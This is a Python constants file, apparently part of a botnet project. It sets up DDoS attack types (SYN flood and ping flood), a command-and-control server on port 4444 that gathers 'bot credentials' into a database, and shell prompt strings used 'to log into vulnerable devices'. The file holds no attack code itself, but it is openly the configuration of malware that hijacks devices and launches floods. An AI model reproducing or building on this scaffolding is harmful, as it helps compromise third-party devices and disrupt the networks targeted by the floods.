# Contains constants for other modules

# versions of python that will run attack vectors
PYTHON_WORKING_VERSIONS = ['2.7']

# Specify path to database
DB_PATH = './db/bots.db'

# list of attack vectors
# create more as you wish
ATTACK_TYPES = {
    'syn_flood': 0,
    'ping_flood': 1
}

# address of CNC server that listens for incoming bot credentials
# and appends them to database
# Configure as you would like
CNC_SERV_ADDR = '0.0.0.0'
CNC_SERV_PORT = 4444

# how many bot connections can be backlogged in listen queue
MAX_BACKLOG = 5

# Needed to log into vulnerable devices
PROMPT = ['>', '#', '$', ':']
